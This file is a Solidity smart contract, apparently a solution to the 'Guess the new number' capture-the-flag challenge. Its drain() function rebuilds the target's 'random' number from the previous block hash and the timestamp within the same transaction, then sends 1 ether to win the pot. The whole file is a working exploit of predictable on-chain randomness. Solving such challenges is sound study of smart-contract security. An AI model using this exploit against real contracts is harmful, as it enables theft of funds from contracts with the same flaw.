//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IGuessTheNumber {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberExploit {
    IGuessTheNumber public immutable guessTheNewNumber;

    constructor(address _address) {
        guessTheNewNumber = IGuessTheNumber(_address);
    }

    function drain() external payable {
        uint8 n = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        guessTheNewNumber.guess{value: 1 ether}(n);
    }

    receive() external payable {}
}
